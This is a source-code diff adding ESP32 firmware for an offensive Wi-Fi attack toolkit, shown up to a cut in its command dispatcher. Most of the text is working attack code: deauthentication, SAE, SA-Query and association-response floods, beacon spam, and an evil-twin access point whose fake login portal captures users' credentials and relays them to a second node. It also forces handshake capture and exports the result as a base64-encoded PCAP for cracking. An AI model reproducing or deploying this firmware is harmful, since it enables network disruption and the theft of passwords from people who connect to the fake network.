@@ -1,0 +1,835 @@
+/**
+ * ESP32 NODE 2 — Full Wireless Security Suite
+ * Commands: monitor start|stop, channel N, scan, deauth <BSSID>,
+ *           deauth stop, beacon start|stop, eviltwin <SSID>,
+ *           eviltwin stop, handshake <BSSID>, handshake stop,
+ *           handshake get, sae <BSSID>, sae stop,
+ *           portscan <IP> <startP> <endP>, wardrive start|stop, status
+ */
+
+#include <WiFi.h>
+#include <esp_wifi.h>
+#include <esp_now.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <WiFiClient.h>
+
+// ── Update this with ESP1's AP MAC (printed on ESP1 serial monitor)
+uint8_t ESP1_MAC[] = {0xE0, 0x5A, 0x1B, 0x75, 0xD1, 0x05};
+
+esp_now_peer_info_t peerInfo;
+
+#define CMD_LEN 160
+static char pendingCmd[CMD_LEN] = {0};
+static volatile bool hasPendingCmd = false;
+
+// ══════════════════════════════════════════════
+//  MONITOR MODE
+// ══════════════════════════════════════════════
+volatile bool     monitorRunning = false;
+volatile uint32_t pktCount       = 0;
+volatile int16_t  lastRSSI       = 0;
+volatile uint8_t  lastChan       = 1;
+unsigned long     lastStatTime   = 0;
+#define STAT_MS 800
+
+// ══════════════════════════════════════════════
+//  HANDSHAKE CAPTURE (PCAP)
+// ══════════════════════════════════════════════
+#define HS_MAX (10 * 1024)
+bool     hsRunning    = false;
+uint8_t  hsBSSID[6]  = {0};
+uint8_t* hsBuf        = nullptr;
+uint32_t hsBufLen     = 0;
+int      hsEapolCount = 0;
+// ISR → loop staging buffer
+volatile bool    hsPktReady = false;
+uint8_t hsTmpPkt[400];
+volatile uint16_t hsTmpLen = 0;
+
+// ══════════════════════════════════════════════
+//  DEAUTH FLOOD
+// ══════════════════════════════════════════════
+bool    deauthRunning = false;
+uint8_t deauthAP[6]  = {0};
+uint8_t deauthCli[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+uint8_t deauthChan   = 1;
+unsigned long lastDeauthTime = 0;
+#define DEAUTH_MS 80
+
+// ══════════════════════════════════════════════
+//  SA-QUERY FLOOD (Management Frame Flooding)
+// ══════════════════════════════════════════════
+bool    saQueryRunning = false;
+uint8_t saQueryAP[6]  = {0};
+uint8_t saQueryChan   = 1;
+unsigned long lastSaQueryTime = 0;
+#define SAQUERY_MS 12
+
+// ══════════════════════════════════════════════
+//  ASSOC RESPONSE FLOOD (Implementation Vuln)
+// ══════════════════════════════════════════════
+bool    assocFloodRunning = false;
+uint8_t assocFloodAP[6]  = {0};
+uint8_t assocFloodChan   = 1;
+unsigned long lastAssocFloodTime = 0;
+#define ASSOCFLOOD_MS 20
+
+// ══════════════════════════════════════════════
+//  SAE (WPA3) FLOOD
+// ══════════════════════════════════════════════
+bool    saeRunning = false;
+uint8_t saeAP[6]   = {0};
+uint8_t saeChan    = 1;
+unsigned long lastSaeTime = 0;
+#define SAE_MS 40
+static uint16_t saeSeq = 1;
+
+// ══════════════════════════════════════════════
+//  BEACON SPAM
+// ══════════════════════════════════════════════
+bool beaconRunning = false;
+unsigned long lastBeaconTime = 0;
+int beaconIdx = 0;
+#define BEACON_MS 80
+#define MAX_SSIDS 15
+char beaconSSIDs[MAX_SSIDS][33] = {
+  "FBI Surveillance Van", "Not Your WiFi", "SkyNet_Global_Nodes",
+  "Virus.exe", "TellMyWiFiLoveHer", "Pretty Fly For A WiFi",
+  "The Promised LAN", "Abraham Linksys", "Silence of the LANs",
+  "Bill WiFi The Science Fi", "The Internet", "FreePublicWiFi",
+  "Loading...", "404 Network Not Found", "HackersHideout"
+};
+int numSSIDs = 15;
+
+// ══════════════════════════════════════════════
+//  EVIL TWIN + CAPTIVE PORTAL
+// ══════════════════════════════════════════════
+bool       evilTwinRunning = false;
+WebServer* evilServer      = nullptr;
+DNSServer* dnsServer       = nullptr;
+
+const char PORTAL_HTML[] = R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WiFi Login</title>
+<style>
+body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
+.card{background:#fff;border-radius:12px;padding:36px 28px;width:320px;box-shadow:0 4px 24px rgba(0,0,0,.12)}
+h2{text-align:center;color:#1a73e8;margin:0 0 6px}
+p{text-align:center;color:#777;font-size:13px;margin:0 0 20px}
+input{width:100%;padding:11px 14px;margin:6px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box;font-size:15px}
+button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:10px}
+</style></head><body>
+<div class="card"><h2>&#128246; WiFi Login</h2>
+<p>Please sign in to access the internet</p>
+<form method="POST" action="/submit">
+<input type="text" name="user" placeholder="Email or Username" required>
+<input type="password" name="pass" placeholder="WiFi Password" required>
+<button type="submit">Sign In &amp; Connect</button>
+</form></div></body></html>
+)rawliteral";
+
+// ══════════════════════════════════════════════
+//  WARDRIVING
+// ══════════════════════════════════════════════
+bool wardrive   = false;
+int  wdScanCh   = 1;
+unsigned long lastWdTime = 0;
+#define WD_INTERVAL 3000
+
+// ══════════════════════════════════════════════
+//  HELPERS
+// ══════════════════════════════════════════════
+void sendToESP1(const char* msg) {
+  size_t l = strlen(msg);
+  if (l > 250) l = 250;
+  esp_now_send(ESP1_MAC, (uint8_t*)msg, l);
+  Serial.printf("[TX] %s\n", msg);
+}
+
+void reinitEspNow() {
+  esp_now_deinit();
+  delay(150);
+  // Must be in STA mode for ESP-NOW to work after a scan
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect(false, true); // disconnect but keep STA mode, don't erase creds
+  delay(100);
+  if (esp_now_init() != ESP_OK) {
+    Serial.println("[ESP-NOW] reinit FAILED");
+    return;
+  }
+  esp_now_register_recv_cb(OnDataRecv);
+  memset(&peerInfo, 0, sizeof(peerInfo));
+  memcpy(peerInfo.peer_addr, ESP1_MAC, 6);
+  peerInfo.channel = 1;  // ESP1 AP is always on channel 1
+  peerInfo.encrypt = false;
+  peerInfo.ifidx   = WIFI_IF_STA;
+  if (esp_now_add_peer(&peerInfo) != ESP_OK) {
+    Serial.println("[ESP-NOW] re-add peer FAILED");
+  } else {
+    Serial.println("[ESP-NOW] reinit OK");
+  }
+}
+
+bool parseMac(const char* str, uint8_t* mac) {
+  return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+    &mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]) == 6;
+}
+
+void macStr(const uint8_t* m, char* out) {
+  sprintf(out, "%02X:%02X:%02X:%02X:%02X:%02X",
+    m[0],m[1],m[2],m[3],m[4],m[5]);
+}
+
+// ── Base64 encoder for PCAP download
+static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+int b64Encode(const uint8_t* in, int inLen, char* out) {
+  int o = 0;
+  for (int i = 0; i < inLen; i += 3) {
+    uint32_t b = (uint32_t)in[i] << 16;
+    if (i+1 < inLen) b |= (uint32_t)in[i+1] << 8;
+    if (i+2 < inLen) b |= in[i+2];
+    out[o++] = B64[(b>>18)&0x3F];
+    out[o++] = B64[(b>>12)&0x3F];
+    out[o++] = (i+1 < inLen) ? B64[(b>>6)&0x3F] : '=';
+    out[o++] = (i+2 < inLen) ? B64[b&0x3F]       : '=';
+  }
+  out[o] = 0;
+  return o;
+}
+
+// ── Write PCAP global header into hsBuf
+void initPcap() {
+  if (!hsBuf) hsBuf = (uint8_t*)malloc(HS_MAX);
+  if (!hsBuf) return;
+  hsBufLen = 0;
+  hsEapolCount = 0;
+  // Global header
+  uint32_t magic = 0xA1B2C3D4;
+  uint16_t vmaj = 2, vmin = 4;
+  int32_t  zone = 0;
+  uint32_t sigs = 0, snap = 65535, net = 105; // IEEE 802.11
+  memcpy(hsBuf+hsBufLen, &magic, 4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, &vmaj,  2); hsBufLen += 2;
+  memcpy(hsBuf+hsBufLen, &vmin,  2); hsBufLen += 2;
+  memcpy(hsBuf+hsBufLen, &zone,  4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, &sigs,  4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, &snap,  4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, &net,   4); hsBufLen += 4;
+}
+
+void appendPcapPkt(const uint8_t* data, int len) {
+  if (!hsBuf || hsBufLen + 16 + len > HS_MAX) return;
+  uint32_t ts_s  = millis() / 1000;
+  uint32_t ts_us = (millis() % 1000) * 1000;
+  uint32_t l     = (uint32_t)len;
+  memcpy(hsBuf+hsBufLen, &ts_s,  4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, &ts_us, 4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, &l,     4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, &l,     4); hsBufLen += 4;
+  memcpy(hsBuf+hsBufLen, data,   len); hsBufLen += len;
+}
+
+// ══════════════════════════════════════════════
+//  SNIFFER CALLBACK (ISR — keep it minimal)
+// ══════════════════════════════════════════════
+void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
+  wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
+  pktCount++;
+  lastRSSI = p->rx_ctrl.rssi;
+  lastChan = p->rx_ctrl.channel;
+
+  // EAPOL detection for handshake capture
+  if (hsRunning && !hsPktReady && type == WIFI_PKT_DATA) {
+    // sig_len includes FCS (4 bytes) — strip it
+    int len = p->rx_ctrl.sig_len;
+    if (len > 4) len -= 4;  // remove FCS
+    if (len < 28 || len > 400) return;
+
+    uint8_t* pl = p->payload;
+    uint16_t fc = *(uint16_t*)pl;
+
+    // Frame Control: bit8=ToDS, bit9=FromDS
+    bool toDS   = (fc >> 8) & 0x01;
+    bool fromDS = (fc >> 8) & 0x02;
+    // QoS bit: subtype bits [7:4] >= 8
+    bool isQos  = ((fc >> 4) & 0x0F) >= 8;
+    int hdrLen  = isQos ? 26 : 24;
+    if (len <= hdrLen + 8) return;
+
+    // Determine BSSID position based on ToDS/FromDS
+    // ToDS=0, FromDS=0: addr3=BSSID
+    // ToDS=1, FromDS=0: addr1=BSSID (infra uplink)
+    // ToDS=0, FromDS=1: addr2=BSSID (infra downlink)
+    // ToDS=1, FromDS=1: WDS — check addr1 and addr2
+    uint8_t* bssid_in_frame;
+    if (!toDS && !fromDS)  bssid_in_frame = pl + 16;  // addr3
+    else if (toDS && !fromDS) bssid_in_frame = pl + 4;  // addr1=AP
+    else                   bssid_in_frame = pl + 10;  // addr2=AP
+
+    uint8_t* llc = pl + hdrLen;
+    // LLC SNAP header: AA AA 03 xx xx xx ET ET
+    if (llc[0] == 0xAA && llc[1] == 0xAA && llc[6] == 0x88 && llc[7] == 0x8E) {
+      if (memcmp(bssid_in_frame, hsBSSID, 6) == 0 || hsBSSID[0] == 0xFF) {
+        memcpy(hsTmpPkt, pl, len);
+        hsTmpLen = (uint16_t)len;
+        hsPktReady = true;
+      }
+    }
+  }
+}
+
+// ══════════════════════════════════════════════
+//  MONITOR
+// ══════════════════════════════════════════════
+void startMonitor() {
+  pktCount = 0;
+  monitorRunning = true;
+  esp_wifi_set_promiscuous_rx_cb(snifferCb);
+  esp_wifi_set_promiscuous(true);
+  sendToESP1("[Node2] Monitor Mode Started.");
+}
+
+void stopMonitor() {
+  monitorRunning = false;
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  sendToESP1("[Node2] Monitor Mode Stopped.");
+}
+
+// ══════════════════════════════════════════════
+//  DEAUTH FLOOD
+// ══════════════════════════════════════════════
+void buildDeauthFrame(uint8_t* frame, const uint8_t* ap, const uint8_t* cli) {
+  frame[0]=0xC0; frame[1]=0x00; // type: deauth
+  frame[2]=0x00; frame[3]=0x00; // duration
+  memcpy(frame+4,  cli, 6);     // DA
+  memcpy(frame+10, ap,  6);     // SA = AP
+  memcpy(frame+16, ap,  6);     // BSSID
+  frame[22]=0x00; frame[23]=0x00;
+  frame[24]=0x07; frame[25]=0x00; // reason: class 3 frame
+}
+
+// Enable raw injection (required for esp_wifi_80211_tx to work)
+void ensurePromiscuous() {
+  if (!monitorRunning) esp_wifi_set_promiscuous(true);
+}
+
+void doDeauth() {
+  uint8_t frm[26];
+  // Deauth from AP → client (spoofed as AP)
+  buildDeauthFrame(frm, deauthAP, deauthCli);
+  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+  // Deauth from client → AP direction too
+  buildDeauthFrame(frm, deauthCli, deauthAP);
+  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+  // Also send Disassoc (0xA0) to trigger SA-Query on WPA3 networks
+  frm[0] = 0xA0; // Disassociation
+  memcpy(frm+4, deauthCli, 6); memcpy(frm+10, deauthAP, 6); memcpy(frm+16, deauthAP, 6);
+  frm[22]=0; frm[23]=0; frm[24]=0x08; frm[25]=0x00;
+  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+}
+
+// SA-Query Flood: overwhelms WPA3 AP's SA-Query queue
+void doSaQueryFlood() {
+  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint8_t frm[26];
+  // Rapid deauth from AP MAC → broadcast (triggers SA-Query on every client)
+  buildDeauthFrame(frm, saQueryAP, bcast);
+  frm[24]=0x07; frm[25]=0x00; esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+  frm[24]=0x03; frm[25]=0x00; esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+  frm[24]=0x01; frm[25]=0x00; esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+  // Disassoc flood too
+  frm[0]=0xA0; frm[24]=0x08; frm[25]=0x00;
+  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+}
+
+// Assoc Response Flood: exploits buggy devices that self-deauth on flood
+void doAssocFlood() {
+  uint8_t frm[30];
+  frm[0]=0x10; frm[1]=0x00; // Association Response
+  frm[2]=0x00; frm[3]=0x00;
+  // Random DA (spoofed target clients)
+  for(int i=0;i<6;i++) frm[4+i] = esp_random() & 0xFF; frm[4] &= 0xFE;
+  memcpy(frm+10, assocFloodAP, 6); // SA = target AP (spoofed)
+  memcpy(frm+16, assocFloodAP, 6); // BSSID
+  frm[22]=saeSeq&0xFF; frm[23]=(saeSeq>>8)&0xFF;
+  frm[24]=0x31; frm[25]=0x04; // Capability: ESS
+  frm[26]=0x00; frm[27]=0x00; // Status: success
+  frm[28]=saeSeq&0xFF; frm[29]=0x00; // AID
+  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+  saeSeq++;
+}
+
+// ══════════════════════════════════════════════
+//  SAE FLOOD
+// ══════════════════════════════════════════════
+void doSaeFlood() {
+  uint8_t frm[30];
+  frm[0]=0xB0; frm[1]=0x00; // Auth frame
+  frm[2]=0x00; frm[3]=0x00;
+  memcpy(frm+4,  saeAP, 6); // DA
+  // fake random SA
+  frm[10]=0x02; frm[11]=(saeSeq>>8)&0xFF; frm[12]=saeSeq&0xFF;
+  frm[13]=esp_random()&0xFF; frm[14]=esp_random()&0xFF; frm[15]=esp_random()&0xFF;
+  memcpy(frm+16, saeAP, 6); // BSSID
+  frm[22]=saeSeq&0xFF; frm[23]=(saeSeq>>8)&0xFF; // seq
+  frm[24]=0x03; frm[25]=0x00; // algo=SAE(3)
+  frm[26]=0x01; frm[27]=0x00; // auth seq 1
+  frm[28]=0x00; frm[29]=0x00; // status OK
+  esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+  saeSeq++;
+}
+
+// ══════════════════════════════════════════════
+//  BEACON SPAM
+// ══════════════════════════════════════════════
+void doBeacon() {
+  const char* ssid = beaconSSIDs[beaconIdx % numSSIDs];
+  int ssidLen = strlen(ssid); if (ssidLen>32) ssidLen=32;
+  uint8_t buf[120]; int p=0;
+  buf[p++]=0x80; buf[p++]=0x00;
+  buf[p++]=0x00; buf[p++]=0x00;
+  memset(buf+p,0xFF,6); p+=6;          // DA broadcast
+  buf[p++]=0x02; buf[p++]=0x00; buf[p++]=0x00;
+  buf[p++]=(beaconIdx>>16)&0xFF; buf[p++]=(beaconIdx>>8)&0xFF; buf[p++]=beaconIdx&0xFF;
+  memcpy(buf+p,buf+p-6,6); p+=6;       // BSSID=SA
+  buf[p++]=0x00; buf[p++]=0x00;        // seq
+  memset(buf+p,0,8); p+=8;            // timestamp
+  buf[p++]=0x64; buf[p++]=0x00;       // interval
+  buf[p++]=0x31; buf[p++]=0x04;       // capability (ESS|Privacy)
+  buf[p++]=0x00; buf[p++]=(uint8_t)ssidLen;
+  memcpy(buf+p,ssid,ssidLen); p+=ssidLen;
+  buf[p++]=0x01; buf[p++]=0x08;
+  buf[p++]=0x82; buf[p++]=0x84; buf[p++]=0x8b; buf[p++]=0x96;
+  buf[p++]=0x0c; buf[p++]=0x12; buf[p++]=0x18; buf[p++]=0x24;
+  buf[p++]=0x03; buf[p++]=0x01; buf[p++]=lastChan; // DS channel
+  esp_wifi_80211_tx(WIFI_IF_STA, buf, p, false);
+  beaconIdx++;
+}
+
+// ══════════════════════════════════════════════
+//  EVIL TWIN + CAPTIVE PORTAL
+// ══════════════════════════════════════════════
+void startEvilTwin(const char* ssid) {
+  stopMonitor();
+  WiFi.mode(WIFI_AP_STA);
+  delay(100);
+  WiFi.softAP(ssid, nullptr, 1, 0, 8);
+  delay(200);
+  if (!dnsServer) { dnsServer = new DNSServer(); dnsServer->start(53,"*",WiFi.softAPIP()); }
+  if (!evilServer) {
+    evilServer = new WebServer(80);
+    evilServer->on("/", HTTP_GET, [](){
+      evilServer->send(200,"text/html",PORTAL_HTML);
+    });
+    evilServer->on("/submit", HTTP_POST, [](){
+      String u = evilServer->arg("user");
+      String pw = evilServer->arg("pass");
+      char buf[200];
+      snprintf(buf,sizeof(buf),"[EvilTwin] CAPTURED: user=%s pass=%s",u.c_str(),pw.c_str());
+      sendToESP1(buf);
+      evilServer->send(200,"text/html",
+        "<html><body style='font-family:Arial;text-align:center;padding:50px'>"
+        "<h2 style='color:green'>&#10003; Connected!</h2>"
+        "<p>Verifying...</p></body></html>");
+    });
+    evilServer->on("/generate_204",   [](){ evilServer->send(200,"text/html",PORTAL_HTML); });
+    evilServer->on("/hotspot-detect.html",[](){ evilServer->send(200,"text/html",PORTAL_HTML);});
+    evilServer->onNotFound([](){
+      evilServer->sendHeader("Location","http://192.168.4.1/");
+      evilServer->send(302);
+    });
+    evilServer->begin();
+  }
+  evilTwinRunning = true;
+  char msg[80]; snprintf(msg,sizeof(msg),"[Node2] EvilTwin '%s' active at 192.168.4.1",ssid);
+  sendToESP1(msg);
+}
+
+void stopEvilTwin() {
+  if (evilServer) { evilServer->close(); delete evilServer; evilServer=nullptr; }
+  if (dnsServer)  { dnsServer->stop();   delete dnsServer;  dnsServer=nullptr; }
+  evilTwinRunning = false;
+  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(200);
+  reinitEspNow();
+  sendToESP1("[Node2] Evil Twin stopped.");
+}
+
+// ══════════════════════════════════════════════
+//  HANDSHAKE CAPTURE
+// ══════════════════════════════════════════════
+void startHandshake(const char* bssidStr) {
+  parseMac(bssidStr, hsBSSID);
+  initPcap();
+
+  // Start promiscuous mode first so we catch the handshake
+  monitorRunning = true;
+  esp_wifi_set_promiscuous_rx_cb(snifferCb);
+  esp_wifi_set_promiscuous(true);
+  hsRunning = true;
+
+  char buf[80];
+  snprintf(buf, sizeof(buf), "[Node2] Handshake capture started. Target: %s", bssidStr);
+  sendToESP1(buf);
+  sendToESP1("[Handshake] Sending deauth burst to force re-association...");
+
+  // Send 8 deauth frames (both directions) to kick clients off, triggering a fresh 4-way handshake
+  uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint8_t frm[26];
+  for (int i = 0; i < 8; i++) {
+    buildDeauthFrame(frm, hsBSSID, bcast);
+    esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
+    delay(10);
+  }
+}
+
+void sendPcapDownload() {
+  if (!hsBuf || hsBufLen < 25) { sendToESP1("[Node2] No handshake captured yet."); return; }
+  // Send as base64 chunks via ESP-NOW
+  #define CHUNK_BYTES 150
+  int total = (hsBufLen + CHUNK_BYTES - 1) / CHUNK_BYTES;
+  char header[60];
+  snprintf(header,sizeof(header),"[PCAP:START:%d:%lu]",total,(unsigned long)hsBufLen);
+  sendToESP1(header);
+  delay(30);
+  char b64buf[210];
+  for (int i = 0; i < total; i++) {
+    int off = i * CHUNK_BYTES;
+    int rem = hsBufLen - off; if (rem > CHUNK_BYTES) rem = CHUNK_BYTES;
+    b64Encode(hsBuf+off, rem, b64buf);
+    char msg[260];
+    snprintf(msg,sizeof(msg),"[PCAP:%d/%d:%s]",i,total,b64buf);
+    sendToESP1(msg);
+    delay(25);
+  }
+  sendToESP1("[PCAP:END]");
+}
+
+// ══════════════════════════════════════════════
+//  PORT SCAN
+// ══════════════════════════════════════════════
+void doPortScan(const char* ip, int startP, int endP) {
+  char msg[100]; snprintf(msg,sizeof(msg),"[PortScan] Scanning %s:%d-%d ...",ip,startP,endP);
+  sendToESP1(msg);
+  int openCount = 0;
+  for (int port = startP; port <= endP; port++) {
+    WiFiClient client;
+    client.setTimeout(300);
+    if (client.connect(ip, port)) {
+      client.stop();
+      openCount++;
+      snprintf(msg,sizeof(msg),"[PortScan] OPEN  %s:%d",ip,port);
+      sendToESP1(msg);
+      delay(10);
+    }
+  }
+  snprintf(msg,sizeof(msg),"[PortScan] Done. %d open port(s) found.",openCount);
+  sendToESP1(msg);
+}
+
+// ══════════════════════════════════════════════
+//  WARDRIVING
+// ══════════════════════════════════════════════
+void doWardrive() {
+  bool wasRunning = monitorRunning;
+  if (wasRunning) { esp_wifi_set_promiscuous(false); }
+  WiFi.mode(WIFI_STA);
+  int found = WiFi.scanNetworks(false,true);
+  char buf[120];
+  snprintf(buf,sizeof(buf),"[Wardrive] Ch%d → found %d APs",wdScanCh,found);
+  sendToESP1(buf);
+  for (int i = 0; i < found && i < 10; i++) {
+    uint8_t* bssid = WiFi.BSSID(i);
+    snprintf(buf,sizeof(buf),"[WD] %02X:%02X:%02X:%02X:%02X:%02X | ch%d | %ddBm | %s",
+      bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
+      WiFi.channel(i), WiFi.RSSI(i), WiFi.SSID(i).c_str());
+    sendToESP1(buf);
+    delay(15);
+  }
+  WiFi.scanDelete();
+  wdScanCh = (wdScanCh % 13) + 1; // advance channel
+  esp_wifi_set_channel(wdScanCh, WIFI_SECOND_CHAN_NONE);
+  if (wasRunning) { esp_wifi_set_promiscuous(true); }
+}
+
+// ══════════════════════════════════════════════
+//  COMMAND DISPATCHER
+// ══════════════════════════════════════════════
+void processCommand(char* cmd) {
+  Serial.printf("[CMD] %s\n", cmd);
+  // Trim trailing newline/space
+  int l = strlen(cmd);
+  while (l > 0 && (cmd[l-1]==' '||cmd[l-1]=='\n'||cmd[l-1]=='\r')) cmd[--l]=0;
+
+  if (strcmp(cmd,"monitor start")==0)  { startMonitor(); }
+  else if (strcmp(cmd,"monitor stop")==0)   { stopMonitor(); }
+  else if (strncmp(cmd,"channel ",8)==0) {
+    int ch = atoi(cmd+8);
+    if (ch>=1&&ch<=13) { esp_wifi_set_channel(ch,WIFI_SECOND_CHAN_NONE); lastChan=ch;
+      char b[40]; snprintf(b,sizeof(b),"[Node2] Channel set to %d",ch); sendToESP1(b); }
+  }
+  else if (strcmp(cmd,"scan")==0) {
+    bool was=monitorRunning;
+    if(was) stopMonitor();
+    // Switch to STA for scanning (promiscuous already off)
+    WiFi.mode(WIFI_STA);
+    delay(100);
+    sendToESP1("[Node2] Scanning...");
+    int n = WiFi.scanNetworks(false, true); // blocking, show hidden
+    // Send results BEFORE touching ESP-NOW
+    for(int i=0; i<n; i++){
+      uint8_t* b = WiFi.BSSID(i);
+      char buf[120];
+      snprintf(buf, sizeof(buf), "[Scan] %02X:%02X:%02X:%02X:%02X:%02X | ch%d | %ddBm | %s",
+        b[0],b[1],b[2],b[3],b[4],b[5], WiFi.channel(i), WiFi.RSSI(i), WiFi.SSID(i).c_str());
+      sendToESP1(buf);
+      delay(20);
+    }
+    char s[50];
+    snprintf(s, sizeof(s), "[Node2] Scan done. Found %d APs.", n);
+    sendToESP1(s);
+    delay(50); // let last message transmit before reinit
+    WiFi.scanDelete();
+    // Reinit ESP-NOW (scan disrupts the STA interface)
+    reinitEspNow();
+    if(was) startMonitor();
+  }
+  // ── IMPORTANT: check specific "stop/get" BEFORE prefix strncmp to avoid shadowing ──
+  else if (strcmp(cmd,"deauth stop")==0) {
+    deauthRunning=false;
+    if (!monitorRunning && !hsRunning && !saQueryRunning && !assocFloodRunning && !saeRunning) esp_wifi_set_promiscuous(false);
+    sendToESP1("[Node2] Deauth stopped.");
+  }
+  else if (strncmp(cmd,"deauth ",7)==0) {
+    // format: deauth <BSSID> <CH> [client]
+    char* tok = strtok(cmd+7," ");
+    if (tok && parseMac(tok, deauthAP)) {
+      char* chStr = strtok(nullptr," ");
+      if (chStr && atoi(chStr)>0) {
+        deauthChan = (uint8_t)atoi(chStr);
+        char* cli = strtok(nullptr," ");
+        if (cli) parseMac(cli, deauthCli); else memset(deauthCli,0xFF,6);
+      } else {
+        if (chStr) parseMac(chStr, deauthCli); else memset(deauthCli,0xFF,6);
+        deauthChan = lastChan;
+      }
+      esp_wifi_set_channel(deauthChan, WIFI_SECOND_CHAN_NONE);
+      ensurePromiscuous(); // REQUIRED for esp_wifi_80211_tx to inject frames
+      deauthRunning=true;
+      char buf[90]; snprintf(buf,sizeof(buf),"[Node2] Deauth flood → %s ch%d",tok,(int)deauthChan);
+      sendToESP1(buf);
+    }
+  }
+  else if (strcmp(cmd,"beacon start")==0) { beaconRunning=true;  sendToESP1("[Node2] Beacon spam started."); }
+  else if (strcmp(cmd,"beacon stop")==0)  { beaconRunning=false; sendToESP1("[Node2] Beacon spam stopped."); }
+  else if (strcmp(cmd,"eviltwin stop")==0) { stopEvilTwin(); }
+  else if (strncmp(cmd,"eviltwin ",9)==0) { startEvilTwin(cmd+9); }
+  else if (strcmp(cmd,"handshake stop")==0) {
+    hsRunning=false; stopMonitor(); sendToESP1("[Node2] Handshake capture stopped.");
+    char b[60]; snprintf(b,sizeof(b),"[Node2] Captured %d EAPOL frames.",hsEapolCount); sendToESP1(b);
+  }
+  else if (strcmp(cmd,"handshake get")==0) { sendPcapDownload(); }
+  else if (strncmp(cmd,"handshake ",10)==0) {
+    // format: handshake <BSSID> <CH>
+    char* bssidStr = strtok(cmd+10," ");
+    char* chStr    = strtok(nullptr," ");
+    if (bssidStr) {
+      if (chStr && atoi(chStr)>0) { lastChan=(uint8_t)atoi(chStr); esp_wifi_set_channel(lastChan,WIFI_SECOND_CHAN_NONE); }
+      startHandshake(bssidStr);
+    }
+  }
+  else if (strcmp(cmd,"sae stop")==0) {
+    saeRunning=false;
+    if (!monitorRunning && !hsRunning && !deauthRunning && !saQueryRunning && !assocFloodRunning) esp_wifi_set_promiscuous(false);
+    sendToESP1("[Node2] SAE flood stopped.");
+  }
+  else if (strncmp(cmd,"sae ",4)==0) {
+    // format: sae <BSSID> <CH>
+    char* bssidStr = strtok(cmd+4," ");
+    char* chStr    = strtok(nullptr," ");
+    if (bssidStr && parseMac(bssidStr, saeAP)) {
+      saeChan = (chStr && atoi(chStr)>0) ? (uint8_t)atoi(chStr) : lastChan;
+      esp_wifi_set_channel(saeChan, WIFI_SECOND_CHAN_NONE);
+      ensurePromiscuous();
+      saeRunning=true;
+      char buf[70]; snprintf(buf,sizeof(buf),"[Node2] SAE flood → %s ch%d",bssidStr,(int)saeChan);
+      sendToESP1(buf);
+    }
+  }
+  else if (strcmp(cmd,"saquery stop")==0) {
+    saQueryRunning=false;
+    if (!monitorRunning && !hsRunning && !deauthRunning && !saeRunning && !assocFloodRunning) esp_wifi_set_promiscuous(false);
+    sendToESP1("[Node2] SA-Query flood stopped.");
+  }
+  else if (strncmp(cmd,"saquery ",8)==0) {
+    // format: saquery <BSSID> <CH>
+    char* bssidStr = strtok(cmd+8," ");
+    char* chStr    = strtok(nullptr," ");
+    if (bssidStr && parseMac(bssidStr, saQueryAP)) {
+      saQueryChan = (chStr && atoi(chStr)>0) ? (uint8_t)atoi(chStr) : lastChan;
+      esp_wifi_set_channel(saQueryChan, WIFI_SECOND_CHAN_NONE);
+      ensurePromiscuous();
+      saQueryRunning=true;
+      char buf[80]; snprintf(buf,sizeof(buf),"[Node2] SA-Query flood → %s ch%d",bssidStr,(int)saQueryChan);
+      sendToESP1(buf);
+    }
+  }
+  else if (strcmp(cmd,"assocflood stop")==0) {
+    assocFloodRunning=false;
+    if (!monitorRunning && !hsRunning && !deauthRunning && !saeRunning && !saQueryRunning) esp_wifi_set_promiscuous(false);
+    sendToESP1("[Node2] Assoc flood stopped.");
+  }
+  else if (strncmp(cmd,"assocflood ",11)==0) {
+    // format: assocflood <BSSID> <CH>
+    char* bssidStr = strtok(cmd+11," ");
+    char* chStr    = strtok(nullptr," ");
+    if (bssidStr && parseMac(bssidStr, assocFloodAP)) {
+      assocFloodChan = (chStr && atoi(chStr)>0) ? (uint8_t)atoi(chStr) : lastChan;
+      esp_wifi_set_channel(assocFloodChan, WIFI_SECOND_CHAN_NONE);
+      ensurePromiscuous();
+      assocFloodRunning=true;
